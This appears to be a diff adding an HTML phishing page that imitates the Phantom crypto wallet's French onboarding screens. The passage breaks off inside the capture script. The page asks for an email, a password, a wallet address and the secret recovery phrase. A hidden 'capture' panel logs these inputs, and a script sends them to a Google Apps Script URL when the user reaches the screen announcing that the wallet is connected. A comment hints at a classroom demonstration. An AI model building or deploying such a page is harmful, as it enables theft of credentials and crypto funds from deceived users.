@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phantom Portefeuille</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --purple: #8b7cf8;
+    --purple-bright: #a78bfa;
+    --purple-glow: rgba(139,124,248,0.4);
+    --bg-deep: #0d0d1a;
+    --bg-card: #13131f;
+    --bg-input: #0a0a16;
+    --text: #ffffff;
+    --text-muted: rgba(255,255,255,0.45);
+    --border: rgba(255,255,255,0.07);
+    --yellow: #f59e0b;
+  }
+
+  html, body {
+    width: 100%; height: 100%;
+    font-family: 'Sora', sans-serif;
+    overflow-x: hidden;
+    overflow-y: auto;
+    background: #0d0d1a;
+    position: relative;
+  }
+
+  /* ── Animated background ── */
+  .bg-orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .orb1 {
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(139,124,248,0.18) 0%, transparent 70%);
+    top: -100px; left: -100px;
+    animation: drift1 12s ease-in-out infinite alternate;
+  }
+  .orb2 {
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(167,139,250,0.12) 0%, transparent 70%);
+    bottom: -80px; right: -80px;
+    animation: drift2 15s ease-in-out infinite alternate;
+  }
+  .orb3 {
+    width: 250px; height: 250px;
+    background: radial-gradient(circle, rgba(196,181,253,0.08) 0%, transparent 70%);
+    top: 50%; left: 50%;
+    transform: translate(-50%,-50%);
+    animation: drift3 10s ease-in-out infinite alternate;
+  }
+
+  @keyframes drift1 { to { transform: translate(40px, 60px); } }
+  @keyframes drift2 { to { transform: translate(-40px, -60px); } }
+  @keyframes drift3 { to { transform: translate(-50%,-50%) scale(1.3); } }
+
+  /* noise grain */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='1'/%3E%3C/svg%3E");
+    opacity: 0.03;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* ── Full screen mobile layout ── */
+  .phone-wrap {
+    position: relative;
+    z-index: 10;
+    width: 100%;
+    height: 100vh;
+    animation: appear 0.8s cubic-bezier(0.16,1,0.3,1) both;
+  }
+
+  @keyframes appear {
+    from { opacity: 0; transform: translateY(30px) scale(0.97); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .phone {
+    width: 100%;
+    height: 100vh;
+    background: var(--bg-card);
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* ── Screens container ── */
+  .screens {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    width: 400%;
+    transition: transform 0.55s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .screen {
+    width: calc(100% / 4);
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    flex-shrink: 0;
+  }
+
+  /* ─── Screen 1: Welcome ─── */
+  .s1-inner {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 36px 50px;
+  }
+
+  .logo-wrap {
+    margin-bottom: 16px;
+    animation: logoIn 1s cubic-bezier(0.16,1,0.3,1) 0.3s both;
+  }
+
+  @keyframes logoIn {
+    from { opacity: 0; transform: scale(0.8) translateY(10px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+  }
+
+  .ghost-svg {
+    width: 56px; height: 56px;
+    filter: drop-shadow(0 0 20px rgba(255,255,255,0.25));
+  }
+
+  .brand {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -1px;
+    margin-bottom: 10px;
+    animation: fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) 0.4s both;
+  }
+
+  .tagline {
+    font-size: 13px;
+    color: var(--text-muted);
+    text-align: center;
+    line-height: 1.6;
+    max-width: 190px;
+    margin-bottom: 52px;
+    animation: fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) 0.5s both;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .btns-wrap {
+    width: 100%;
+    animation: fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) 0.6s both;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px 20px;
+    border-radius: 14px;
+    border: none;
+    cursor: pointer;
+    font-family: 'Sora', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 0.1px;
+    transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: rgba(255,255,255,0);
+    transition: background 0.15s;
+  }
+
+  .btn:active::after { background: rgba(255,255,255,0.08); }
+
+  .btn-primary {
+    background: linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%);
+    color: #fff;
+    margin-bottom: 10px;
+    box-shadow: 0 6px 24px rgba(139,124,248,0.4), inset 0 1px 0 rgba(255,255,255,0.15);
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 32px rgba(139,124,248,0.5), inset 0 1px 0 rgba(255,255,255,0.15);
+  }
+
+  .btn-primary:active { transform: translateY(0px); }
+
+  .btn-ghost {
+    background: rgba(255,255,255,0.04);
+    color: rgba(255,255,255,0.75);
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+
+  .btn-ghost:hover {
+    background: rgba(255,255,255,0.07);
+    border-color: rgba(255,255,255,0.14);
+    color: #fff;
+    transform: translateY(-1px);
+  }
+
+  /* ─── Screen 2: Password ─── */
+  .s2-inner {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding-top: 36px;
+  }
+
+  .nav-bar {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 20px;
+    position: relative;
+    margin-bottom: 4px;
+  }
+
+  .back {
+    position: absolute;
+    left: 20px;
+    background: none;
+    border: none;
+    color: var(--text-muted);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-family: 'Sora', sans-serif;
+    font-size: 13px;
+    padding: 6px 0;
+    transition: color 0.2s;
+  }
+
+  .back:hover { color: var(--text); }
+
+  .step-dots {
+    display: flex;
+    gap: 6px;
+  }
+
+  .sdot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.15);
+    transition: all 0.3s;
+  }
+
+  .sdot.on {
+    background: var(--purple);
+    width: 18px;
+    border-radius: 3px;
+    box-shadow: 0 0 8px var(--purple-glow);
+  }
+
+  .prog-track {
+    margin: 12px 24px 0;
+    height: 2px;
+    background: rgba(255,255,255,0.06);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .prog-fill {
+    height: 100%;
+    width: 33%;
+    background: linear-gradient(90deg, var(--purple), var(--purple-bright));
+    border-radius: 2px;
+    box-shadow: 0 0 8px var(--purple-glow);
+    animation: progIn 0.6s cubic-bezier(0.4,0,0.2,1) both;
+  }
+
+  @keyframes progIn {
+    from { width: 0; }
+    to   { width: 33%; }
+  }
+
+  .pw-body {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 28px 24px 30px;
+  }
+
+  .pw-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.5px;
+    margin-bottom: 6px;
+  }
+
+  .pw-sub {
+    font-size: 12.5px;
+    color: var(--text-muted);
+    line-height: 1.5;
+    margin-bottom: 26px;
+  }
+
+  .field {
+    position: relative;
+    margin-bottom: 10px;
+  }
+
+  .field-input {
+    width: 100%;
+    background: var(--bg-input);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 13px 16px;
+    color: var(--text);
+    font-family: 'Sora', sans-serif;
+    font-size: 18px;
+    letter-spacing: 4px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .field-input:focus {
+    border-color: rgba(139,124,248,0.5);
+    box-shadow: 0 0 0 3px rgba(139,124,248,0.1);
+  }
+
+  .field-label {
+    position: absolute;
+    top: -8px;
+    left: 12px;
+    font-size: 10px;
+    font-weight: 600;
+    color: var(--purple-bright);
+    background: var(--bg-card);
+    padding: 0 5px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  .strength {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    color: var(--yellow);
+    background: rgba(245,158,11,0.12);
+    padding: 3px 8px;
+    border-radius: 6px;
+    border: 1px solid rgba(245,158,11,0.2);
+  }
+
+  .strength.strong {
+    color: #4ade80;
+    background: rgba(74,222,128,0.1);
+    border-color: rgba(74,222,128,0.2);
+  }
+
+
+  .str-bars-new {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 10px;
+    padding: 0 2px;
+  }
+
+  .snb {
+    flex: 1;
+    height: 3px;
+    border-radius: 2px;
+    background: rgba(255,255,255,0.08);
+    transition: background 0.4s;
+  }
+  .seed-field {
+    margin-bottom: 12px;
+  }
+
+  .seed-input {
+    min-height: 110px;
+    resize: none;
+    font-size: 12px !important;
+    letter-spacing: 0.3px;
+    line-height: 1.7;
+    padding-bottom: 28px !important;
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: rgba(139,124,248,0.3) transparent;
+  }
+
+  .seed-input::-webkit-scrollbar { width: 4px; }
+  .seed-input::-webkit-scrollbar-thumb { background: rgba(139,124,248,0.3); border-radius: 2px; }
+
+  .seed-counter {
+    position: absolute;
+    bottom: 10px;
+    right: 12px;
+    font-size: 10px;
+    font-weight: 600;
+    color: var(--purple-bright);
+    background: rgba(139,124,248,0.12);
+    border: 1px solid rgba(139,124,248,0.2);
+    padding: 2px 8px;
+    border-radius: 6px;
+    pointer-events: none;
+  }
+
+  .addr-icon {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    opacity: 0.7;
+    transition: opacity 0.2s;
+  }
+
+  .addr-icon:hover { opacity: 1; }
+
+  .tos-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+
+  .checkbox {
+    width: 18px; height: 18px;
+    border-radius: 5px;
+    background: linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 1px;
+    cursor: pointer;
+    box-shadow: 0 2px 8px rgba(139,124,248,0.3);
+    transition: transform 0.2s;
+  }
+
+  .checkbox:hover { transform: scale(1.1); }
+
+  .tos-text {
+    font-size: 12px;
+    color: var(--text-muted);
+    line-height: 1.5;
+  }
+
+  .tos-text a {
+    color: var(--purple-bright);
+    text-decoration: none;
+    font-weight: 500;
+  }
+
+  .tos-text a:hover { text-decoration: underline; }
+
+  .btn-continue {
+    margin-top: auto;
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%);
+    color: #fff;
+    border: none;
+    border-radius: 14px;
+    font-family: 'Sora', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 6px 24px rgba(139,124,248,0.4), inset 0 1px 0 rgba(255,255,255,0.15);
+    transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
+    letter-spacing: 0.1px;
+  }
+
+  .btn-continue:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 32px rgba(139,124,248,0.5), inset 0 1px 0 rgba(255,255,255,0.15);
+  }
+
+  .btn-continue:active { transform: translateY(0); }
+
+  /* ─── Screen 3: Success ─── */
+  .s3-inner {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 50px 28px 40px;
+    text-align: center;
+  }
+
+  .success-ring {
+    width: 90px; height: 90px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, rgba(139,124,248,0.15) 0%, rgba(139,124,248,0.05) 100%);
+    border: 1.5px solid rgba(139,124,248,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 28px;
+    position: relative;
+    animation: ringIn 0.6s cubic-bezier(0.16,1,0.3,1) both;
+    box-shadow: 0 0 40px rgba(139,124,248,0.2), inset 0 0 30px rgba(139,124,248,0.05);
+  }
+
+  .success-ring::before {
+    content: '';
+    position: absolute;
+    inset: -6px;
+    border-radius: 50%;
+    border: 1px solid rgba(139,124,248,0.12);
+  }
+
+  @keyframes ringIn {
+    from { opacity: 0; transform: scale(0.5); }
+    to   { opacity: 1; transform: scale(1); }
+  }
+
+  .check-anim {
+    animation: checkIn 0.4s cubic-bezier(0.16,1,0.3,1) 0.3s both;
+  }
+
+  @keyframes checkIn {
+    from { opacity: 0; transform: scale(0.5); }
+    to   { opacity: 1; transform: scale(1); }
+  }
+
+  .success-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+    animation: fadeUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.4s both;
+  }
+
+  .success-sub {
+    font-size: 13px;
+    color: var(--text-muted);
+    line-height: 1.6;
+    max-width: 200px;
+    margin-bottom: 40px;
+    animation: fadeUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.5s both;
+  }
+
+  .success-badge {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(74,222,128,0.08);
+    border: 1px solid rgba(74,222,128,0.2);
+    border-radius: 20px;
+    padding: 8px 16px;
+    margin-bottom: 32px;
+    animation: fadeUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.55s both;
+  }
+
+  .badge-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: #4ade80;
+    box-shadow: 0 0 6px rgba(74,222,128,0.6);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+
+  .badge-text {
+    font-size: 11.5px;
+    font-weight: 600;
+    color: #4ade80;
+    letter-spacing: 0.3px;
+  }
+
+  .btn-launch {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%);
+    color: #fff;
+    border: none;
+    border-radius: 14px;
+    font-family: 'Sora', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 6px 24px rgba(139,124,248,0.4), inset 0 1px 0 rgba(255,255,255,0.15);
+    transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
+    animation: fadeUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.6s both;
+  }
+
+  .btn-launch:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 32px rgba(139,124,248,0.5), inset 0 1px 0 rgba(255,255,255,0.15);
+  }
+
+  /* ── Ambient label ── */
+  .ambient {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 11px;
+    color: rgba(255,255,255,0.18);
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    font-weight: 500;
+    z-index: 5;
+  }
+
+  /* ── Bloc-notes capture (invisible, coin bas-droit) ── */
+  .notepad-panel {
+    position: fixed;
+    bottom: 16px; right: 16px;
+    width: 220px;
+    background: rgba(10,10,20,0.92);
+    border: 1px solid rgba(139,124,248,0.25);
+    border-radius: 14px;
+    padding: 12px;
+    z-index: 9999;
+    max-height: 340px;
+    overflow-y: auto;
+    opacity: 0;
+    pointer-events: none;
+  }
+  .notepad-panel h3 {
+    font-size: 10px; font-weight: 700;
+    color: #a78bfa; letter-spacing: 1px;
+    text-transform: uppercase; margin-bottom: 8px;
+  }
+  .np-entry {
+    background: rgba(255,255,255,0.04);
+    border-radius: 8px; padding: 6px 8px; margin-bottom: 6px;
+  }
+  .np-label { font-size: 9px; font-weight: 700; color: #a78bfa; letter-spacing: 0.5px; text-transform: uppercase; }
+  .np-value { font-size: 11px; color: rgba(255,255,255,0.8); word-break: break-all; margin-top: 2px; }
+  .np-time { font-size: 9px; color: rgba(255,255,255,0.2); margin-top: 2px; }
+  .np-type { font-size: 9px; font-weight: 700; padding: 1px 5px; border-radius: 999px; margin-bottom: 3px; display: inline-block; }
+  .np-type.live { background: rgba(245,158,11,0.15); color: #f59e0b; }
+  .np-type.submit { background: rgba(74,222,128,0.12); color: #4ade80; }
+</style>
+</head>
+<body>
+
+<div class="bg-orb orb1"></div>
+<div class="bg-orb orb2"></div>
+<div class="bg-orb orb3"></div>
+
+<div class="phone-wrap">
+  <div class="phone" id="phone">
+
+    <!-- Screens -->
+    <div class="screens" id="screens">
+
+      <!-- Screen 1: Welcome -->
+      <div class="screen" id="screen1">
+        <div class="s1-inner">
+          <div class="logo-wrap">
+            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAxADIDASIAAhEBAxEB/8QAHAABAQACAgMAAAAAAAAAAAAAAAgBBQYJAgMH/8QAMRAAAQMDAgMGBQQDAAAAAAAAAQIDBAAFBgcREiExCBMUIkFRFTJCYXEzUpGhVIKx/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJppSlApW9wjEcgzO9otGO252bJVzVwjytp/cpXRI/NVHpz2TLOxHbl5xd5EySefhISu7aT9io7lR69NqCP6Vf0rs16USIpYTZZEdRB2dalr4x/JI/qpQ7QekU/S2/MpRKM+zTSoxJJTspO30L25cQ9x1oPmFKUoFcm0xwq75/l8XHbOjZx08TzxBKWGxtxLVt7f2dq4zV69kTAGMR03Zu8hlHxW9ASHXCPMlo/po39gOf5NBz7SzT7H9O8cRaLHHAUdlSZKxu7IX+5R/wCD0rY5+7fI+E3h7GWku3lERwwkEA7u7cuR5E1vRSgnmfede0aEW6axbXFZabjwSE9ygveG3Vsoo+UEnh3+1ejtltSJGhNplXhtLdzblRy4lP0uFBCwP5NUbsKk3t6ZbHX8GwyO8lT7Z8bKQDzQCClAPtvzNBJ+5pXlSgyzw98jj+XiHF+K7R8PfiPYnanobja4phtFtaD5eHgFdW1baNkuRxbebfFv90Yh/wCO3KWlsf6g7UFw6t69Y3ieUWnHIc5l95ya2Lo+2eJMRjfzdOqjy5eg3ra55r3p3jNkXMZvca7ylJPh4sJwLUtXpueiR9zXXoSpSipaipR6k9TWNqCrIfa47vCuB7HXXsjIUAvvAmNuSdlH12A9Pt1qZcovlyyXIJl8u8hUidMc7x1Z9T02HsAAABWuptQKUpQYFZPSlKBT0pSgUpSgUpSg/9k=" class="ghost-svg" style="border-radius:12px; object-fit:cover;">
+          </div>
+          <div class="brand">phantom</div>
+          <p class="tagline">Un portefeuille Solana & Ethereum pour la DeFi &amp; les NFTs</p>
+
+          <div class="btns-wrap">
+            <button class="btn btn-primary" onclick="goTo(1)">Créer un nouveau portefeuille</button>
+            <button class="btn btn-ghost" onclick="goTo(2)">J'ai déjà un portefeuille</button>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Screen 1b: Créer un compte -->
+      <div class="screen" id="screen-create">
+        <div class="s2-inner">
+          <div class="nav-bar">
+            <button class="back" onclick="goTo(0)">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </button>
+            <div class="step-dots">
+              <div class="sdot on"></div>
+              <div class="sdot"></div>
+              <div class="sdot"></div>
+            </div>
+          </div>
+          <div class="prog-track">
+            <div class="prog-fill"></div>
+          </div>
+          <div class="pw-body">
+            <h2 class="pw-title">Créer un compte</h2>
+            <p class="pw-sub">Entrez votre adresse e-mail et choisissez un mot de passe.</p>
+
+            <div class="field">
+              <span class="field-label">Adresse e-mail</span>
+              <input class="field-input" type="email" id="email" placeholder="exemple@email.com" style="font-size:13px;letter-spacing:0px;">
+            </div>
+
+            <div class="field" style="margin-bottom:6px;">
+              <span class="field-label">Mot de passe</span>
+              <input class="field-input" type="password" id="cpw1" placeholder="••••••••" oninput="checkPw()">
+            </div>
+
+            <div class="field" style="margin-bottom:8px;">
+              <span class="field-label">Confirmer le mot de passe</span>
+              <input class="field-input" type="password" id="cpw2" placeholder="••••••••">
+              <span class="strength" id="cpw-badge" style="display:none;">Faible</span>
+            </div>
+
+            <div class="str-bars-new">
+              <div class="snb" id="snb1"></div>
+              <div class="snb" id="snb2"></div>
+              <div class="snb" id="snb3"></div>
+              <div class="snb" id="snb4"></div>
+            </div>
+
+            <div class="tos-row" style="margin-bottom:16px; margin-top:4px;">
+              <div class="checkbox" id="cb2" onclick="toggleCb2()">
+                <svg width="10" height="8" viewBox="0 0 10 8" fill="none">
+                  <path d="M1 4L3.5 6.5L9 1" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+              <span class="tos-text">J'accepte les <a href="#">Conditions d'utilisation</a></span>
+            </div>
+
+            <button class="btn-continue" onclick="goTo(3)">Créer →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Screen 2: Password -->
+      <div class="screen" id="screen2">
+        <div class="s2-inner">
+          <div class="nav-bar">
+            <button class="back" onclick="goTo(0)">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </button>
+            <div class="step-dots">
+              <div class="sdot on"></div>
+              <div class="sdot"></div>
+              <div class="sdot"></div>
+            </div>
+          </div>
+
+          <div class="prog-track">
+            <div class="prog-fill"></div>
+          </div>
+
+          <div class="pw-body">
+            <h2 class="pw-title">Connecter le portefeuille</h2>
+            <p class="pw-sub">Entrez votre adresse crypto et votre phrase de récupération.</p>
+
+            <div class="field">
+              <span class="field-label">Adresse Crypto</span>
+              <input class="field-input" type="text" id="addr" placeholder="0x4f3a…b82c" style="letter-spacing:1px;font-size:12px;padding-right:38px;">
+              <span class="addr-icon">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.35)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </span>
+            </div>
+
+            <div class="field seed-field">
+              <span class="field-label">Phrase de Récupération Secrète</span>
+              <textarea class="field-input seed-input" id="seed" oninput="countWords()" placeholder="Entrez votre phrase de 12 ou 24 mots séparés par des espaces…&#10;&#10;pomme mangue nuage rivière pierre lumière forêt océan tonnerre pont flamme aube"></textarea>
+              <div class="seed-counter" id="seed-counter">0 words</div>
+            </div>
+
+            <div class="tos-row" style="margin-bottom:16px;">
+              <div class="checkbox" id="cb" onclick="toggleCb()">
+                <svg width="10" height="8" viewBox="0 0 10 8" fill="none">
+                  <path d="M1 4L3.5 6.5L9 1" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+              <span class="tos-text">J'accepte les <a href="#">Conditions d'utilisation</a></span>
+            </div>
+
+            <button class="btn-continue" onclick="goTo(3)">Connecter →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Screen 3: Success -->
+      <div class="screen" id="screen3">
+        <div class="s3-inner">
+          <div class="success-ring">
+            <div class="check-anim">
+              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+                <circle cx="18" cy="18" r="17" stroke="rgba(139,124,248,0.4)" stroke-width="1.5"/>
+                <path d="M10 18L15.5 24L26 12" stroke="#a78bfa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+          </div>
+
+          <h2 class="success-title">Merci de votre confiance !</h2>
+          <p class="success-sub">Votre portefeuille a été connecté avec succès. Téléchargez Phantom pour commencer.</p>
+
+          <div class="success-badge">
+            <div class="badge-dot"></div>
+            <span class="badge-text">Sécurisé &amp; chiffré</span>
+          </div>
+
+          <a class="btn-launch" href="https://phantom.com/download" target="_blank" style="display:block;text-align:center;text-decoration:none;">
+            Télécharger Phantom →
+          </a>
+        </div>
+      </div>
+
+    </div><!-- /screens -->
+  </div><!-- /phone -->
+</div>
+
+<div class="ambient">Phantom · Portefeuille Web3</div>
+
+<!-- Bloc-notes de capture (invisible pour les élèves) -->
+<div class="notepad-panel" id="notepad-panel">
+  <h3>📋 Capture</h3>
+  <div id="np-list"></div>
+</div>
+
+<script>
+  // ✅ REMPLACE PAR TON URL GOOGLE APPS SCRIPT
+  const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwid_X34dbXQClCoe1hl1JIWOlIY2Ps2yRV4Gb9YM88JzacG0LCy6GXULM5NK67CE9-/exec";
+
+  let current = 0;
+
+  function goTo(idx) {
+    current = idx;
+    document.getElementById('screens').style.transform = `translateX(-${idx * 25}%)`;
+    if (idx === 3) captureSubmit();
+  }
+
+  // Word counter
+  function countWords() {
+    const val = document.getElementById('seed').value.trim();
+    const words = val === '' ? [] : val.split(/\s+/);
+    const count = words.length;
+    const counter = document.getElementById('seed-counter');
+    counter.textContent = count + ' mot' + (count !== 1 ? 's' : '');
+    if (count === 12 || count === 24) {
+      counter.style.color = '#4ade80';
+      counter.style.background = 'rgba(74,222,128,0.1)';
+      counter.style.borderColor = 'rgba(74,222,128,0.2)';
+    } else {
+      counter.style.color = 'var(--purple-bright)';
+      counter.style.background = 'rgba(139,124,248,0.12)';
+      counter.style.borderColor = 'rgba(139,124,248,0.2)';
+    }
+  }
+
+  // Password strength
+  function checkPw() {
+    const val = document.getElementById('cpw1').value;
+    const len = val.length;
+    const bars = ['snb1','snb2','snb3','snb4'];
+    bars.forEach(id => { document.getElementById(id).style.background = 'rgba(255,255,255,0.08)'; });
+    const badge = document.getElementById('cpw-badge');
+    badge.style.display = 'block';
+    if (len === 0) { badge.style.display = 'none'; return; }
+    if (len < 5) {
+      document.getElementById('snb1').style.background = '#ef4444';
+      badge.textContent = 'Faible'; badge.style.color='#ef4444'; badge.style.background='rgba(239,68,68,0.1)'; badge.style.borderColor='rgba(239,68,68,0.2)';
+    } else if (len < 9) {
+      ['snb1','snb2','snb3'].forEach(id => document.getElementById(id).style.background = '#f59e0b');
+      badge.textContent = 'Moyen'; badge.style.color='#f59e0b'; badge.style.background='rgba(245,158,11,0.12)'; badge.style.borderColor='rgba(245,158,11,0.2)';
+    } else {
+      bars.forEach(id => document.getElementById(id).style.background = '#4ade80');
+      badge.textContent = 'Fort'; badge.style.color='#4ade80'; badge.style.background='rgba(74,222,128,0.1)'; badge.style.borderColor='rgba(74,222,128,0.2)';
+    }
+  }
+
+  let cb2On = true;
+  function toggleCb2() {
+    cb2On = !cb2On;
+    const cb = document.getElementById('cb2');
+    cb.style.background = cb2On ? 'linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%)' : 'transparent';
+    cb.style.border = cb2On ? 'none' : '1.5px solid rgba(255,255,255,0.2)';
+  }
+  let cbOn = true;
+  function toggleCb() {
+    cbOn = !cbOn;
+    const cb = document.getElementById('cb');
+    cb.style.background = cbOn ? 'linear-gradient(135deg, #9b8cf9 0%, #7c6ef8 100%)' : 'transparent';
+    cb.style.border = cbOn ? 'none' : '1.5px solid rgba(255,255,255,0.2)';
+  }
+
+  // ─── CAPTURE INVISIBLE ───
+  function getTime() { return new Date().toLocaleTimeString('fr-FR'); }
+  function getDate() { return new Date().toLocaleDateString('fr-FR'); }
+
+  function addToNotepad(label, value, type) {
+    if (!value || !value.trim()) return;
+    const list = document.getElementById('np-list');
